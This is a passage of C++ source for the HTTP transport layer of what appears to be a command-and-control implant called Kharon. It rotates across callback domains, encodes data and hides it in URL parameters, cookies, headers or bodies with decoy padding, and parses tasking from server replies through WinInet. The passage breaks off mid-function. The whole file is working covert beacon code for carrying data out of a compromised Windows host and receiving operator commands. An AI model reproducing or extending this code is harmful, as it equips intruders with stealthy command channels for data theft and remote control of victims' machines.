#include <Kharon.h>

using namespace Root;

#define DOMAIN_STRATEGY_ROUNDROBIN 0x25
#define DOMAIN_STRATEGY_FAILOVER   0x50
#define DOMAIN_STRATEGY_RANDOM     0x70

#define APPEND_OBJECTFREE(Ctx, Data) \
    Ctx->ObjectFree.Length++; \
    Ctx->ObjectFree.Ptr = (PVOID*)hReAlloc(Ctx->ObjectFree.Ptr, sizeof(PVOID) * Ctx->ObjectFree.Length); \
    Ctx->ObjectFree.Ptr[Ctx->ObjectFree.Length - 1] = Data;

#if PROFILE_C2 == PROFILE_HTTP
auto DECLFN Transport::StrategyRot( VOID ) -> HTTP_CALLBACKS* {
    Self->Config.Http.Strategy = DOMAIN_STRATEGY_RANDOM;

    ULONG           Strategy       = Self->Config.Http.Strategy;
    HTTP_CALLBACKS* TargetCallback = { nullptr };
    ULONG           MaxIdx         = Self->Config.Http.CallbacksCount-1;

    switch ( Strategy ) {
        //
        // failover strategy rotation routine
        //
        case DOMAIN_STRATEGY_FAILOVER: {
            if ( this->FailCount == 10 ) {

                if ( this->FailoverIdx == MaxIdx ) {
                    this->FailoverIdx = 0;
                } else {
                    this->FailoverIdx++;
                }
            }

            TargetCallback = Self->Config.Http.Callbacks[this->FailoverIdx];

            break;
        }

        //
        // round robin strategy rotation routine
        //
        case DOMAIN_STRATEGY_ROUNDROBIN: {
            TargetCallback = Self->Config.Http.Callbacks[this->RoundRobinIdx];

            if ( this->RoundRobinIdx == MaxIdx ) {
                this->RoundRobinIdx = 0;
            } else {
                this->RoundRobinIdx++;
            }

            break;
        }

        //
        // random strategy rotation routine
        //
        case DOMAIN_STRATEGY_RANDOM: {
            ULONG Index = ( Rnd32() % Self->Config.Http.CallbacksCount );
            TargetCallback = Self->Config.Http.Callbacks[Index];

            break;
        }
    }

    return TargetCallback;
}

auto DECLFN Transport::CleanupHttpContext( 
    _In_ HTTP_CONTEXT* Ctx 
) -> BOOL {
    if ( !Ctx ) return FALSE;
    
    if ( Ctx->wTargetUrl ) hFree( Ctx->wTargetUrl );
    if ( Ctx->cTargetUrl ) hFree( Ctx->cTargetUrl );
    if ( Ctx->RequestHandle ) Self->Wininet.InternetCloseHandle( Ctx->RequestHandle );
    if ( Ctx->ConnectHandle ) Self->Wininet.InternetCloseHandle( Ctx->ConnectHandle );
    if ( Ctx->SessionHandle ) Self->Wininet.InternetCloseHandle( Ctx->SessionHandle );
    
    Self->Wininet.InternetSetOptionW( nullptr, INTERNET_OPTION_END_BROWSER_SESSION, nullptr, 0 );
    
    for ( Ctx->ObjectFree.Length; Ctx->ObjectFree.Length > 0; Ctx->ObjectFree.Length-- ) {
        if ( Ctx->ObjectFree.Ptr[ Ctx->ObjectFree.Length - 1 ] ) {
            hFree( Ctx->ObjectFree.Ptr[ Ctx->ObjectFree.Length - 1 ] );
            Ctx->ObjectFree.Ptr[ Ctx->ObjectFree.Length - 1 ] = nullptr;
        }
    }

    if ( Ctx->ObjectFree.Ptr ) {
        hFree( Ctx->ObjectFree.Ptr );
        Ctx->ObjectFree.Ptr = nullptr;
    }
    
    return Ctx->Success;
}

auto DECLFN Transport::PrepareUrlAndMethod(
    _In_  HTTP_CONTEXT*   Ctx,
    _In_  HTTP_CALLBACKS* Callback,
    _In_  BOOL            Secure,
    _Out_ WCHAR**         OutMethodStr,
    _Out_ HTTP_METHOD*    OutMethod
) -> BOOL {
    WCHAR PortStr[6] = { 0 };
    
    // Allocate URL buffers
    Ctx->wTargetUrl = (WCHAR*)hAlloc( MAX_PATH * 4 );
    Ctx->cTargetUrl = (CHAR*)hAlloc( MAX_PATH * 2 );
    
    if ( ! Ctx->wTargetUrl || ! Ctx->cTargetUrl ) {
        KhDbg("Failed to allocate URL buffers");
        return FALSE;
    }
    
    // Select HTTP method
    WCHAR* MethodStr = nullptr;
    switch ( Callback->Method ) {
        case HTTP_METHOD_ONLY_GET: {
            MethodStr = L"GET";
            *OutMethod = Callback->Get;
            break;
        }
        case HTTP_METHOD_ONLY_POST: {
            MethodStr = L"POST";
            *OutMethod = Callback->Post;
            break;
        }
        case HTTP_METHOD_USE_BOTH: {
            if ( Rnd32() & 1 ) {
                MethodStr = L"POST";
                *OutMethod = Callback->Post;
            } else {
                MethodStr = L"GET";
                *OutMethod = Callback->Get;
            }
            break;
        }
        default: {
            MethodStr = L"GET";
            *OutMethod = Callback->Get;
        }
    }
    
    // Build target URL
    Self->Msvcrt.k_swprintf( PortStr, L"%u", Callback->Port );
    
    Self->Msvcrt.k_swprintf(
        Ctx->wTargetUrl, L"%s%s%s%s%s", 
        Secure ? L"https://" : L"http://", 
        Callback->Host, L":", PortStr, 
        Ctx->Path ? Ctx->Path : L"/"
    );

    Self->Msvcrt.sprintf(
        Ctx->cTargetUrl, "%ls%ls%ls%ls%ls",
        Secure ? L"https://" : L"http://",
        Callback->Host, L":", PortStr, 
        Ctx->Path ? Ctx->Path : L"/"
    );
    
    *OutMethodStr = MethodStr;
    
    KhDbg("Method: %ls - Target URL: %ls", MethodStr, Ctx->wTargetUrl);
    return TRUE;
}

auto DECLFN Transport::EncodeClientData( 
    _In_ HTTP_CONTEXT*  Ctx,
    _In_ MM_INFO*       SendData, 
    _In_ MM_INFO*       EncodedData,
    _In_ OUTPUT_FORMAT* ClientOut
) -> BOOL {
    switch ( ClientOut->Format ) {
        case OutputFmt::Base32: {
            EncodedData->Size = Self->Pkg->Base32( SendData->Ptr, SendData->Size, nullptr, 0, Base32Action::Get_Size );
            
            if ( ! EncodedData->Size ) {
                KhDbg("Failed to get base32 encode size");
                return FALSE;
            }
            
            EncodedData->Ptr = (PBYTE)hAlloc( EncodedData->Size + 1 );
            if ( ! EncodedData->Ptr ) {
                KhDbg("Failed to allocate base32 buffer");
                return FALSE;
            }
            
            if ( ! Self->Pkg->Base32( SendData->Ptr, SendData->Size, EncodedData->Ptr, EncodedData->Size + 1, Base32Action::Encode ) ) {
                KhDbg("Failed to encode base32");
                return FALSE;
            }
            
            KhDbg("Data encoded with base32 - Size: %zu", EncodedData->Size);
            break;
        }
        case OutputFmt::Base64: {
            EncodedData->Size = Self->Pkg->Base64( SendData->Ptr, SendData->Size, nullptr, 0, Base64Action::Get_Size );
            
            if ( ! EncodedData->Size ) {
                KhDbg("Failed to get base64 encode size");
                return FALSE;
            }
            
            EncodedData->Ptr = (PBYTE)hAlloc( EncodedData->Size + 1 );
            if ( ! EncodedData->Ptr ) {
                KhDbg("Failed to allocate base64 buffer");
                return FALSE;
            }
            
            if ( ! Self->Pkg->Base64( SendData->Ptr, SendData->Size, EncodedData->Ptr, EncodedData->Size + 1, Base64Action::Encode ) ) {
                KhDbg("Failed to encode base64");
                return FALSE;
            }
            
            KhDbg("Data encoded with base64 - Size: %zu", EncodedData->Size);
            break;
        }
        case OutputFmt::Base64Url: {
            EncodedData->Size = Self->Pkg->Base64URL( SendData->Ptr, SendData->Size, nullptr, 0, Base64URLAction::Get_Size );
            
            if ( !EncodedData->Size ) {
                KhDbg("Failed to get base64url encode size");
                return FALSE;
            }
            
            EncodedData->Ptr = (PBYTE)hAlloc( EncodedData->Size + 1 );
            if ( ! EncodedData->Ptr ) {
                KhDbg("Failed to allocate base64url buffer");
                return FALSE;
            }
            
            SIZE_T EncodedSize = Self->Pkg->Base64URL( SendData->Ptr, SendData->Size, EncodedData->Ptr, EncodedData->Size + 1, Base64URLAction::Encode );
            
            if ( ! EncodedSize ) {
                KhDbg("Failed to encode base64url");
                return FALSE;
            }
            
            EncodedData->Size = EncodedSize;
            KhDbg("Data encoded with base64url - Size: %zu", EncodedData->Size);
            break;
        }
        case OutputFmt::Hex: {
            EncodedData->Size = Self->Pkg->Hex( SendData->Ptr, SendData->Size, nullptr, 0, HexAction::Get_Size );
            
            if ( !EncodedData->Size ) {
                KhDbg("Failed to get hex encode size");
                return FALSE;
            }
            
            EncodedData->Ptr = (PBYTE)hAlloc( EncodedData->Size + 1 );
            if ( !EncodedData->Ptr ) {
                KhDbg("Failed to allocate hex buffer");
                return FALSE;
            }
            
            if ( !Self->Pkg->Hex( SendData->Ptr, SendData->Size, EncodedData->Ptr, EncodedData->Size + 1, HexAction::Encode ) ) {
                KhDbg("Failed to encode hex");
                return FALSE;
            }
            
            KhDbg("Data encoded with hex - Size: %zu", EncodedData->Size);
            break;
        }
        case OutputFmt::Raw: {
            *EncodedData = *SendData;
            KhDbg("Data format is raw - no encoding applied");
            break;
        }
        default:
            return FALSE;
    }

    if ( EncodedData->Ptr ) {
        APPEND_OBJECTFREE( Ctx, EncodedData->Ptr );
    }
    
    return TRUE;
}

auto DECLFN Transport::DecodeServerData(
    _In_ HTTP_CONTEXT*  Ctx,
    _In_ MM_INFO*       RespData, 
    _In_ MM_INFO*       DecodedData,
    _In_ OUTPUT_FORMAT* ServerOut
) -> BOOL {
    MM_INFO ParsedData = { 0 };
    SIZE_T  DataStart  = ServerOut->Prepend.Size;
    SIZE_T  DataEnd    = RespData->Size - ServerOut->Append.Size;
    
    if ( DataStart > RespData->Size || DataEnd < DataStart ) {
        KhDbg("Invalid server response - Prepend/append overflow");
        return FALSE;
    }
    
    ParsedData.Size = DataEnd - DataStart;
    
    if ( ParsedData.Size <= 0 ) {
        KhDbg("No data after removing prepend/append");
        DecodedData->Ptr = nullptr;
        DecodedData->Size = 0;
        return TRUE;
    }
    
    ParsedData.Ptr = (PBYTE)hAlloc( ParsedData.Size + 1 );
    if ( ! ParsedData.Ptr ) {
        KhDbg("Failed to allocate parsed data buffer");
        return FALSE;
    }

    if ( ParsedData.Ptr ) {
        APPEND_OBJECTFREE( Ctx, ParsedData.Ptr );
    }
    
    Mem::Copy( ParsedData.Ptr, RespData->Ptr + DataStart, ParsedData.Size );
    
    switch ( ServerOut->Format ) {
        case OutputFmt::Base32: {
            SIZE_T DecodedSize = Self->Pkg->Base32( ParsedData.Ptr, ParsedData.Size, nullptr, 0, Base32Action::Get_Size );
            DecodedData->Ptr = (PBYTE)hAlloc( DecodedSize + 1 );
            
            if ( ! DecodedData->Ptr ) {
                return FALSE;
            }
            
            DecodedData->Size = Self->Pkg->Base32( ParsedData.Ptr, ParsedData.Size, DecodedData->Ptr, DecodedSize, Base32Action::Decode );
            
            if ( DecodedData->Size == 0 ) {
                KhDbg("Base32 decoding failed");
                return FALSE;
            }
            
            KhDbg("Base32 decoded - Size: %zu", DecodedData->Size);
            break;
        }
        case OutputFmt::Base64: {
            DecodedData->Size = Self->Pkg->Base64( ParsedData.Ptr, ParsedData.Size, nullptr, 0, Base64Action::Get_Size );
            
            if ( ! DecodedData->Size ) {
                return FALSE;
            }
            
            DecodedData->Ptr = (PBYTE)hAlloc( DecodedData->Size + 1 );
            if ( ! DecodedData->Ptr ) {
                return FALSE;
            }
            
            if ( ! Self->Pkg->Base64( ParsedData.Ptr, ParsedData.Size, DecodedData->Ptr, DecodedData->Size + 1, Base64Action::Decode ) ) {
                KhDbg("Base64 decoding failed");
                return FALSE;
            }
            
            KhDbg("Base64 decoded - Size: %zu", DecodedData->Size);
            break;
        }
        case OutputFmt::Base64Url: {
            SIZE_T RequiredSize = Self->Pkg->Base64URL( ParsedData.Ptr, ParsedData.Size, nullptr, 0, Base64URLAction::Get_Size );
            
            if ( RequiredSize == 0 ) {
                KhDbg("Get_Size returned 0");
                return FALSE;
            }
            
            DecodedData->Ptr = (PBYTE)hAlloc( RequiredSize );
            if ( ! DecodedData->Ptr ) {
                return FALSE;
            }
            
            SIZE_T DecodedSize = Self->Pkg->Base64URL( ParsedData.Ptr, ParsedData.Size, DecodedData->Ptr, RequiredSize, Base64URLAction::Decode );
            
            if ( DecodedSize == 0 || DecodedSize > RequiredSize ) {
                KhDbg("Base64URL decode failed");
                return FALSE;
            }
            
            DecodedData->Size = DecodedSize;
            KhDbg("Base64URL decoded - Size: %zu", DecodedData->Size);
            break;
        }
        case OutputFmt::Hex: {
            SIZE_T DecodedSize = Self->Pkg->Hex( ParsedData.Ptr, ParsedData.Size, nullptr, 0, HexAction::Get_Size );
            DecodedData->Ptr = (PBYTE)hAlloc( DecodedSize + 1 );
            
            if ( ! DecodedData->Ptr ) {
                return FALSE;
            }
            
            DecodedData->Size = Self->Pkg->Hex( ParsedData.Ptr, ParsedData.Size, DecodedData->Ptr, DecodedSize, HexAction::Decode );
            
            if ( DecodedData->Size == 0 ) {
                KhDbg("Hex decoding failed");
                return FALSE;
            }
            
            KhDbg("Hex decoded - Size: %zu", DecodedData->Size);
            break;
        }
        case OutputFmt::Raw: {
            *DecodedData = ParsedData;
            KhDbg("Raw format - no decoding");
            break;
        }
        default:
            return FALSE;
    }
    
    return TRUE;
}

auto DECLFN Transport::ProcessClientOutput(
    _In_ HTTP_CONTEXT*  Ctx,
    _In_ MM_INFO*       EncodedData,
    _In_ OUTPUT_TYPE    ClientOutType,
    _In_ HTTP_ENDPOINT* Endpoint,
    _In_ HTTP_METHOD*   Method,
    _In_ OUTPUT_FORMAT* ClientOut
) -> BOOL {
    MM_INFO Output = { 0 };
    
    // Build output with prepend/append
    Output.Size = ClientOut->Append.Size + ClientOut->Prepend.Size + EncodedData->Size;
    Output.Ptr  = (PBYTE)hAlloc( Output.Size + 1 );
    
    if ( ! Output.Ptr ) {
        KhDbg("Failed to allocate output buffer");
        return FALSE;
    }
    
    if ( ClientOut->Prepend.Size > 0 && ClientOut->Prepend.Ptr ) {
        Mem::Copy( Output.Ptr, ClientOut->Prepend.Ptr, ClientOut->Prepend.Size );
    }
    
    Mem::Copy( Output.Ptr + ClientOut->Prepend.Size, EncodedData->Ptr, EncodedData->Size );
    
    if ( ClientOut->Append.Size > 0 && ClientOut->Append.Ptr ) {
        Mem::Copy( 
            Output.Ptr + ClientOut->Prepend.Size + EncodedData->Size,
            ClientOut->Append.Ptr, 
            ClientOut->Append.Size 
        );
    }
    
    KhDbg("Output buffer built - Size: %zu", Output.Size);
    
    // Process based on output type
    switch ( ClientOutType ) {
        case Output_Parameter: {
            KhDbg("Output type: Parameter");
            
            WCHAR* OutputWidePtr = (WCHAR*)hAlloc( (Output.Size + 1) * sizeof(WCHAR) );
            if ( ! OutputWidePtr ) {
                return FALSE;
            }
            
            for ( SIZE_T i = 0; i < Output.Size; i++ ) {
                OutputWidePtr[i] = (WCHAR)((UCHAR)Output.Ptr[i]);
            }
            OutputWidePtr[Output.Size] = L'\0';
            
            WCHAR* PathFullBuff = nullptr;
            
            if ( Endpoint->Parameters.Ptr && Endpoint->Parameters.Size > 0 && *Endpoint->Parameters.Ptr  ) {
                ULONG EndpointParamLen = Str::LengthW( (WCHAR*)Endpoint->Parameters.Ptr );
                ULONG ClientParamLen   = Str::LengthW( (WCHAR*)ClientOut->Parameter.Ptr );
                ULONG EndpointPathLen  = Str::LengthW( Endpoint->Path );
                ULONG PathLen          = EndpointPathLen + 1 + EndpointParamLen + 1 + ClientParamLen + 1 + Output.Size + 1;
                
                PathFullBuff = (WCHAR*)hAlloc( (PathLen + 1) * sizeof(WCHAR) );
                if ( ! PathFullBuff ) {
                    return FALSE;
                }
                
                Self->Msvcrt.k_swprintf(
                    PathFullBuff, L"%s?%s&%s=%s", 
                    Endpoint->Path, 
                    (WCHAR*)Endpoint->Parameters.Ptr, 
                    (WCHAR*)ClientOut->Parameter.Ptr, 
                    OutputWidePtr
                );
            } else {
                ULONG ClientParamLen  = Str::LengthW( (WCHAR*)ClientOut->Parameter.Ptr );
                ULONG EndpointPathLen = Str::LengthW( Endpoint->Path );
                ULONG PathLen         = EndpointPathLen + 1 + ClientParamLen + 1 + Output.Size + 1;
                
                PathFullBuff = (WCHAR*)hAlloc( (PathLen + 1) * sizeof(WCHAR) );
                if ( ! PathFullBuff ) {
                    return FALSE;
                }
                
                Self->Msvcrt.k_swprintf(
                    PathFullBuff, L"%s?%s=%s", 
                    Endpoint->Path, 
                    (WCHAR*)ClientOut->Parameter.Ptr, 
                    OutputWidePtr
                );
            }

            Ctx->Path     = PathFullBuff;
            Ctx->Body     = ClientOut->FalseBody;
            Ctx->Headers  = nullptr;
            
            if ( OutputWidePtr ) {
                APPEND_OBJECTFREE( Ctx, OutputWidePtr );
            }
            if ( PathFullBuff ) {
                APPEND_OBJECTFREE( Ctx, PathFullBuff );
            }
            if ( Output.Ptr ) {
                APPEND_OBJECTFREE( Ctx, Output.Ptr );
            }   

            break;
        }
        case Output_Cookie: {
            KhDbg("Output type: Cookie");
            
            if ( ClientOut->Cookie.Ptr ) {
                CHAR cCookie[MAX_PATH];
                Mem::Zero( (UPTR)cCookie, MAX_PATH );
                Str::WCharToChar( cCookie, (WCHAR*)ClientOut->Cookie.Ptr, Str::LengthW( (WCHAR*)ClientOut->Cookie.Ptr ) + 1 );
                
                Output.Ptr[Output.Size] = '\0';
                
                if ( ! Self->Wininet.InternetSetCookieA( Ctx->cTargetUrl, cCookie, (CHAR*)Output.Ptr ) ) {
                    KhDbg("Failed to set cookie with error: %d", KhGetError);
                }
                
                KhDbg("Cookie set - Url: %s", Ctx->cTargetUrl);
                KhDbg("Cookie set - Key: %s", cCookie);
                KhDbg("Cookie set - Val: %s", Output.Ptr);
            }
            
            Ctx->Body     = ClientOut->FalseBody;
            
            if ( Output.Ptr ) {
                APPEND_OBJECTFREE( Ctx, Output.Ptr );
            }

            break;
        }
        case Output_Header: {
            KhDbg("Output type: Header");
            
            if ( Endpoint->Parameters.Ptr && Endpoint->Parameters.Size > 0  && *Endpoint->Parameters.Ptr ) {
                ULONG ParamLen = Str::LengthW( (WCHAR*)Endpoint->Parameters.Ptr );
                ULONG PathLen  = Str::LengthW( Endpoint->Path );
                ULONG PathFullSize = PathLen + 1 + ParamLen + 1;
                
                WCHAR* PathFullBuff = (WCHAR*)hAlloc( (PathFullSize + 1) * sizeof(WCHAR) );
                if ( !PathFullBuff ) {
                    return FALSE;
                }
                
                Self->Msvcrt.k_swprintf( PathFullBuff, L"%s?%s", Endpoint->Path, (WCHAR*)Endpoint->Parameters.Ptr );
                Ctx->Path = PathFullBuff;
                
                if ( PathFullBuff ) {
                    APPEND_OBJECTFREE( Ctx, PathFullBuff );
                }

            } else {
                Ctx->Path = Endpoint->Path;
            }
            
            ULONG MethodHdrLen = Str::LengthW( Method->Headers );
            ULONG CustomHdrLen = (WCHAR*)Endpoint->ClientOutput.Header.Ptr ? Str::LengthW( (WCHAR*)Endpoint->ClientOutput.Header.Ptr ) : 0;
            ULONG FinalLen     = MethodHdrLen + CustomHdrLen + Output.Size + 32;
            
            Ctx->Headers = (WCHAR*)hAlloc( (FinalLen + 1) * sizeof(WCHAR) );
            if ( ! Ctx->Headers ) {
                return FALSE;
            }
            
            WCHAR* HeaderPtr = Ctx->Headers;
            
            if ( MethodHdrLen > 0 ) {
                Mem::Copy( HeaderPtr, Method->Headers, MethodHdrLen * sizeof(WCHAR) );
                HeaderPtr += MethodHdrLen;
            }
            
            if ( CustomHdrLen > 0 ) {
                Mem::Copy( HeaderPtr, Endpoint->ClientOutput.Header.Ptr, CustomHdrLen * sizeof(WCHAR) );
                HeaderPtr += CustomHdrLen;
            }
            
            if ( Output.Size > 0 ) {
                Mem::Copy( HeaderPtr, Output.Ptr, Output.Size );
                HeaderPtr = (WCHAR*)((PBYTE)HeaderPtr + Output.Size);
            }
            
            *HeaderPtr++ = L'\r';
            *HeaderPtr++ = L'\n';
            *HeaderPtr = L'\0';

            if ( Output.Ptr ) {
                APPEND_OBJECTFREE( Ctx, Output.Ptr );
            }
            if ( Ctx->Headers ) {
                APPEND_OBJECTFREE( Ctx, Ctx->Headers );
            }
            
            Ctx->Body     = ClientOut->FalseBody;
            break;
        }
        case Output_Body: {
            KhDbg("Output type: Body");
            
            if ( Endpoint->Parameters.Ptr && Endpoint->Parameters.Size && *Endpoint->Parameters.Ptr ) {
                ULONG ParamLen     = Str::LengthW( (WCHAR*)Endpoint->Parameters.Ptr );
                ULONG PathLen      = Str::LengthW( Endpoint->Path );
                ULONG PathFullSize = PathLen + 1 + ParamLen + 1;
                
                WCHAR* PathFullBuff = (WCHAR*)hAlloc( (PathFullSize + 1) * sizeof(WCHAR) );
                if ( ! PathFullBuff ) {
                    return FALSE;
                }
                
                Self->Msvcrt.k_swprintf( PathFullBuff, L"%s?%s", Endpoint->Path, (WCHAR*)Endpoint->Parameters.Ptr );
                Ctx->Path     = PathFullBuff;

                if ( PathFullBuff ) {
                    APPEND_OBJECTFREE( Ctx, PathFullBuff );
                }
            } else {
                Ctx->Path = Endpoint->Path;
            }
            
            if ( Output.Ptr ) {
                APPEND_OBJECTFREE( Ctx, Output.Ptr );
            }
            
            Ctx->Body = Output;
            break;
        }
        default:
            return FALSE;
    }
    
    return TRUE;
}

auto DECLFN Transport::ProcessServerOutput(
    _In_ HTTP_CONTEXT*  Ctx,
    _In_ HANDLE         RequestHandle,
    _In_ CHAR*          cTargetUrl,
    _In_ OUTPUT_TYPE    ServerOutType,
    _In_ OUTPUT_FORMAT* ServerOut,
    _In_ MM_INFO*       RespData
) -> BOOL {
    switch ( ServerOutType ) {
        case Output_Cookie: {
            KhDbg("Processing cookie response");
            
            CHAR cCookie[MAX_PATH];
            Mem::Zero( (UPTR)cCookie, MAX_PATH );
            Str::WCharToChar( cCookie, (WCHAR*)ServerOut->Cookie.Ptr, Str::LengthW( (WCHAR*)ServerOut->Cookie.Ptr ) + 1 );
            
            KhDbg("cookie: %ls %s %s", ServerOut->Cookie.Ptr, cCookie, cTargetUrl);

            ULONG CookieDataSz = 0;
            Self->Wininet.InternetGetCookieExA( cTargetUrl, cCookie, nullptr, &CookieDataSz, 0, nullptr );
            
            if ( CookieDataSz == 0 ) {
                KhDbg("No cookie data found: %d", KhGetError);
                return FALSE;
            }
            
            PBYTE CookieDataPtr = (PBYTE)hAlloc( CookieDataSz );
            if ( ! CookieDataPtr ) {
                return FALSE;
            }
            
            if ( ! Self->Wininet.InternetGetCookieExA( cTargetUrl, cCookie, (CHAR*)CookieDataPtr, &CookieDataSz, 0, nullptr ) ) {
                KhDbg("Failed to retrieve cookie data: %d", KhGetError);
                return FALSE;
            }
            
            RespData->Ptr  = CookieDataPtr + Str::LengthA( cCookie ) + 1;
            RespData->Size = CookieDataSz - Str::LengthA( cCookie ) - 1 - 1;
            
            KhDbg("Cookie retrieved - Size: %lu", RespData->Size);

            if ( CookieDataPtr ) {
                APPEND_OBJECTFREE( Ctx, CookieDataPtr );
            }

            break;
        }
        case Output_Header: {
            KhDbg("Processing header response - Looking for: %S", ServerOut->Header.Ptr);
            
            DWORD HeaderIndex = 0;
            DWORD BufferSize  = 0;
            
            Self->Wininet.HttpQueryInfoW(
                RequestHandle, HTTP_QUERY_RAW_HEADERS_CRLF, nullptr, &BufferSize, &HeaderIndex
            );
            
            if ( BufferSize == 0 ) {
                KhDbg("No headers in response");
                return FALSE;
            }
            
            WCHAR* AllHeaders = (WCHAR*)hAlloc( BufferSize );
            if ( ! AllHeaders ) {
                return FALSE;
            }

            if ( AllHeaders ) {
                APPEND_OBJECTFREE( Ctx, AllHeaders );
            }
            
            if ( ! Self->Wininet.HttpQueryInfoW(
                RequestHandle, HTTP_QUERY_RAW_HEADERS_CRLF, AllHeaders, &BufferSize, &HeaderIndex
            )) {
                return FALSE;
            }
            
            WCHAR* CurrentLine = AllHeaders;
            BOOL   Found       = FALSE;
            
            WCHAR LowerHeaderName[256] = {0};
            Str::CopyW(LowerHeaderName, (WCHAR*)ServerOut->Header.Ptr);
            for (WCHAR* p = LowerHeaderName; *p; p++) {
                if (*p >= L'A' && *p <= L'Z') {
                    *p = *p + (L'a' - L'A');
                }
            }
            
            while (CurrentLine && *CurrentLine && !Found) {
                WCHAR* LineEnd = nullptr;
                for (WCHAR* p = CurrentLine; *p; p++) {
                    if (*p == L'\r' && *(p + 1) == L'\n') {
                        LineEnd = p;
                        break;
                    }
                }
                
                WCHAR SavedChar = L'\0';
                if (LineEnd) {
                    SavedChar = *LineEnd;
                    *LineEnd = L'\0';
                }
                
                WCHAR* ColonPos = nullptr;
                for (WCHAR* p = CurrentLine; *p; p++) {
                    if (*p == L':') {
                        ColonPos = p;
                        break;
                    }
                }
                
                if (ColonPos) {
                    *ColonPos = L'\0';
                    
                    WCHAR* CurrentHeaderName = CurrentLine;
                    WCHAR* CurrentHeaderValue = ColonPos + 1;
                    
                    while (*CurrentHeaderValue == L' ') {
                        CurrentHeaderValue++;
                    }
                    
                    WCHAR LowerCurrentHeader[256] = {0};
                    Str::CopyW(LowerCurrentHeader, CurrentHeaderName);
                    for (WCHAR* p = LowerCurrentHeader; *p; p++) {
                        if (*p >= L'A' && *p <= L'Z') {
                            *p = *p + (L'a' - L'A');
                        }
                    }
                    
                    BOOL Match = TRUE;
                    WCHAR* p1 = LowerHeaderName;
                    WCHAR* p2 = LowerCurrentHeader;
                    while (*p1 && *p2) {
                        if (*p1 != *p2) {
                            Match = FALSE;
                            break;
                        }
                        p1++;
                        p2++;
                    }
                    
                    if (Match && *p1 == L'\0' && *p2 == L'\0') {
                        SIZE_T WideLen = Str::LengthW(CurrentHeaderValue);
                        
                        CHAR* HeaderValue = (CHAR*)hAlloc(WideLen + 1);
                        if (!HeaderValue) {
                            *ColonPos = L':';
                            if (LineEnd) *LineEnd = SavedChar;
                            return FALSE;
                        }

                        if ( HeaderValue ) {
                            APPEND_OBJECTFREE( Ctx, HeaderValue );
                        }
                        
                        SIZE_T ConvertedLen = Str::WCharToChar(HeaderValue, CurrentHeaderValue, WideLen + 1);
                        RespData->Size = ConvertedLen - 1;
                        RespData->Ptr = B_PTR(HeaderValue);
                        Found = TRUE;
                    }
                    
                    *ColonPos = L':';
                }
                
                if (LineEnd) {
                    *LineEnd = SavedChar;
                    CurrentLine = LineEnd + 2;
                } else {
                    break;
                }
            }
                        
            if ( !Found ) {
                KhDbg("Header not found");
                return FALSE;
            }
            break;
        }
        case Output_Body: {
            KhDbg("Processing body response");
            
            UINT32 ContentLength = 0;
            ULONG ContentLenLen = sizeof( ContentLength );
            DWORD BytesRead = 0;
            
            BOOL Success = Self->Wininet.HttpQueryInfoW(
                RequestHandle, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER,
                &ContentLength, &ContentLenLen, NULL
            );
            
            if ( Success && ContentLength > 0 ) {
                RespData->Ptr = B_PTR( hAlloc( ContentLength + 1 ) );
                if ( !RespData->Ptr ) {
                    return FALSE;
                }
                
                Self->Wininet.InternetReadFile( RequestHandle, RespData->Ptr, ContentLength, &BytesRead );
                if ( BytesRead != ContentLength ) {
                    KhDbg("Incomplete read");
                    return FALSE;
                }
                
                RespData->Size = BytesRead;
                KhDbg("Body read - %lu bytes", BytesRead);
                return TRUE;
            }
            
            // Chunked reading
            PVOID TmpBuffer = PTR( hAlloc( BEG_BUFFER_LENGTH ) );
            if ( ! TmpBuffer ) {
                return FALSE;
            }

            if ( TmpBuffer ) {
                APPEND_OBJECTFREE( Ctx, TmpBuffer );
            }
            
            const SIZE_T MAX_RESPONSE_SIZE = 10 * 1024 * 1024;
            SIZE_T RespCapacity = BEG_BUFFER_LENGTH;
            
            RespData->Ptr = B_PTR( hAlloc( RespCapacity ) );
            if ( !RespData->Ptr ) {
                return FALSE;
            }

            if ( RespData->Ptr ) {
                APPEND_OBJECTFREE( Ctx, RespData->Ptr );
            }
            
            RespData->Size = 0;
            
            do {
                Success = Self->Wininet.InternetReadFile( RequestHandle, TmpBuffer, BEG_BUFFER_LENGTH, &BytesRead );
                if ( !Success || BytesRead == 0 ) break;
                
                if ( (RespData->Size + BytesRead) > RespCapacity ) {
                    SIZE_T newCapacity = max( RespCapacity * 2, RespData->Size + BytesRead );
                    if ( newCapacity > MAX_RESPONSE_SIZE ) {
                        KhDbg("Response too large");
                        return FALSE;
                    }
                    
                    PVOID newBuffer = PTR( hReAlloc( RespData->Ptr, newCapacity ) );
                    if ( !newBuffer ) {
                        return FALSE;
                    }
                    
                    RespData->Ptr = B_PTR( newBuffer );
                    RespCapacity = newCapacity;
                }
                
                Mem::Copy( PTR( U_PTR( RespData->Ptr ) + RespData->Size ), TmpBuffer, BytesRead );
                RespData->Size += BytesRead;
            } while ( BytesRead > 0 );
            
            return Success;
        }
        default:
            KhDbg("Unknown server output type");
            return FALSE;
    }
    
    return TRUE;
}

auto DECLFN Transport::OpenInternetSession(
    _In_ HTTP_CONTEXT*   Ctx,
    _In_ HTTP_CALLBACKS* Callback,
    _In_ BOOL            ProxyEnabled,
    _In_ WCHAR*          ProxyUrl
) -> BOOL {
    ULONG HttpAccessType = ProxyEnabled ? INTERNET_OPEN_TYPE_PROXY : 0;
    
    Ctx->SessionHandle = Self->Wininet.InternetOpenW(   
        Callback->UserAgent, HttpAccessType,
        ProxyEnabled ? ProxyUrl : nullptr, 0, 0
    );
    
    if ( ! Ctx->SessionHandle ) {
        KhDbg("Failed to open internet session - Error: %d", KhGetError);
        return FALSE;
    }
    
    KhDbg("Internet session opened");
    return TRUE;
}

auto DECLFN Transport::ConnectToServer(
    _In_ HTTP_CONTEXT* Ctx,
    _In_ HTTP_CALLBACKS* Callback,
    _In_ BOOL   ProxyEnabled,
    _In_ WCHAR* ProxyUsername,
    _In_ WCHAR* ProxyPassword
) -> BOOL {
    Ctx->ConnectHandle = Self->Wininet.InternetConnectW(
        Ctx->SessionHandle, Callback->Host, Callback->Port,
        ProxyEnabled ? ProxyUsername : nullptr, 
        ProxyEnabled ? ProxyPassword : nullptr,
        INTERNET_SERVICE_HTTP, 0, 0
    );
    
    if ( ! Ctx->ConnectHandle ) {
        KhDbg("Failed to connect - Host: %S Port: %u Error: %d", Callback->Host, Callback->Port, KhGetError);
        return FALSE;
    }
    
    KhDbg("Connection established");
    return TRUE;
}

auto DECLFN Transport::SendHttpRequest(
    _In_ HTTP_CONTEXT* Ctx,
    _In_ WCHAR*   Method,
